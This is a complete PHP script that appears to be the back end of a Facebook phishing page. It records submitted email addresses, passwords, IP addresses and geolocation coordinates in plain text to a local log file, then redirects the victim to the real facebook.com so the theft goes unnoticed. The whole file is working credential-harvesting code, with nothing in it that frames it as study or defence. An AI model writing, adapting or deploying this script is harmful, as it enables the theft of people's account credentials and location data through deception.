<?php
$logFile = "log.log";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
   $email = isset($_POST["email"]) ? $_POST["email"] : null;
   $password = isset($_POST["pass"]) ? $_POST["pass"] : null;
   $ipAddress = isset($_POST["ip_address"]) ? $_POST["ip_address"] : "Unknown";
   $latitude = isset($_POST["latitude"]) ? $_POST["latitude"] : "Unknown";
   $longitude = isset($_POST["longitude"]) ? $_POST["longitude"] : "Unknown";

   // Prepare log line
   $timestamp = date("Y-m-d H:i:s");

   // Check if email and password are set
   if ($email && $password) {
      $logLine = "Timestamp: " . $timestamp . ", IP: " . $ipAddress . ", Email: " . $email . ", Password: " . $password . ", Latitude: " . $latitude . ", Longitude: " . $longitude . "\n";
   } else {
      $logLine = "Timestamp: " . $timestamp . ", IP: " . $ipAddress . "\n";
   }

   // Append log line to file
   file_put_contents($logFile, $logLine, FILE_APPEND);

   header("Location: https://www.facebook.com");
   exit();
}
?>
